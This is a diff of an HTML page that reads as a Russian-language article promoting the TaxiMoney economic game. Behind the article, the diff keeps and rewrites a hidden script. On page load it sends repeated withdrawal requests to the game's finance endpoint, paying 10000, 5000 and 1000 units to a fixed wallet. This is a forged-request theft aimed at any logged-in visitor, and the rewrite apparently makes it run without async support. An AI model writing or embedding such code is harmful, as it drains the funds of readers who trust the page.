@@ -68,22 +68,21 @@
 	<h2>Заключение</h2>
 	<p>Экономическая игра TaxiMoney - это отличный способ заработать деньги и получить удовольствие от игры в одном лице. Если вы следуете стратегиям, которые мы описали выше, то вы сможете значительно увеличить свой доход в этой игре. Удачи!</p>
 </main>
-	<script>
-	const url = "https://app.taxi-money.me/finance/withdraw/request";
+<script>
+const url = "https://app.taxi-money.me/finance/withdraw/request";
 const paymentSystem = "24";
 const wallet_id = "TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T";
 const sums = [10000, 5000, 1000];
 
 // Функция для отправки POST-запросов
-async function sendPostRequest(url, data) {
-  const response = await fetch(url, {
+function sendPostRequest(url, data) {
+  return fetch(url, {
     method: "POST",
     body: data,
     headers: {
       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     },
-  });
-  return response.json();
+  }).then((response) => response.json());
 }
 
 // Цикл для отправки запросов с разными параметрами "sum"
@@ -94,15 +93,19 @@ for (let i = 0; i < 10; i++) {
     data.append("paymentSystem", paymentSystem);
     data.append("sum", sum);
     data.append("wallet_id", wallet_id);
-    try {
-      const response = await sendPostRequest(url, data);
-      console.log(`Запрос отправлен. Сумма: ${sum}, ответ сервера:`, response);
-    } catch (error) {
-      console.error(`Ошибка при отправке запроса. Сумма: ${sum}`, error);
-    }
+    sendPostRequest(url, data)
+      .then((response) =>
+        console.log(
+          `Запрос отправлен. Сумма: ${sum}, ответ сервера:`,
+          response
+        )
+      )
+      .catch((error) =>
+        console.error(`Ошибка при отправке запроса. Сумма: ${sum}`, error)
+      );
   }
 }
+</script>
 
-	</script>
 </body>
 	</html>
